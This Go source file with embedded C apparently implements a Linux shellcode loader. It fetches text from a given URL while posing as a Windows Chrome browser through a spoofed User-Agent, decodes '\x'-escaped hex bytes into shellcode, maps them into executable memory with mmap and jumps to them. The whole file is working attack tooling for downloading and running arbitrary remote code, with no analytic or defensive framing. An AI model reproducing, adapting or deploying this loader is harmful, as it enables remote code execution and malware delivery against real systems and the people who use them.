// loader_linux.go
//go:build linux

package main

import (
	"fmt"
	"io"
	"net/http"
	"strconv"
	"time"
	"unsafe"
)

/*
#include <sys/mman.h>
#include <string.h>

static void execute_shellcode(unsigned char* sc, unsigned int sc_len) {
    void *memory = mmap(NULL, sc_len, PROT_READ | PROT_WRITE | PROT_EXEC,
                       MAP_PRIVATE | MAP_ANONYMOUS, -1, 0);
    if (memory == MAP_FAILED) return;

    memcpy(memory, sc, sc_len);
    ((void(*)())memory)();
}
*/
import "C"

func executeLoader(shellcodeURL string) {
	shellcode, err := readShellcodeFromURL(shellcodeURL)
	if err != nil {
		fmt.Printf("Error downloading shellcode: %v\n", err)
		return
	}

	if len(shellcode) == 0 {
		fmt.Printf("Error: No shellcode bytes found\n")
		return
	}

	fmt.Printf("Loaded %d bytes of shellcode from URL\n", len(shellcode))

	C.execute_shellcode(
		(*C.uchar)(unsafe.Pointer(&shellcode[0])),
		C.uint(len(shellcode)),
	)
}

func readShellcodeFromURL(url string) ([]byte, error) {
	client := &http.Client{
		Timeout: 15 * time.Second,
	}

	req, err := http.NewRequest("GET", url, nil)
	if err != nil {
		return nil, fmt.Errorf("error creating request: %v", err)
	}
	req.Header.Set("User-Agent", "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36")
	req.Header.Set("Accept", "text/plain")
	req.Header.Set("Connection", "close")

	resp, err := client.Do(req)
	if err != nil {
		return nil, fmt.Errorf("error connecting: %v", err)
	}
	defer resp.Body.Close()

	if resp.StatusCode != http.StatusOK {
		return nil, fmt.Errorf("HTTP error: %d", resp.StatusCode)
	}

	const maxShellcodeSize = 2 << 20 // 2MB
	body, err := io.ReadAll(io.LimitReader(resp.Body, maxShellcodeSize))
	if err != nil {
		return nil, fmt.Errorf("error reading body: %v", err)
	}

	if len(body) == maxShellcodeSize {
		return nil, fmt.Errorf("shellcode too large")
	}

	text := string(body)
	var shellcode []byte

	for i := 0; i < len(text)-3; i++ {
		if text[i] == '\\' && text[i+1] == 'x' {
			hexStr := text[i+2 : i+4]
			if len(hexStr) == 2 {
				if b, err := strconv.ParseUint(hexStr, 16, 8); err == nil {
					shellcode = append(shellcode, byte(b))
				}
			}
			i += 3
		}
	}

	return shellcode, nil
}
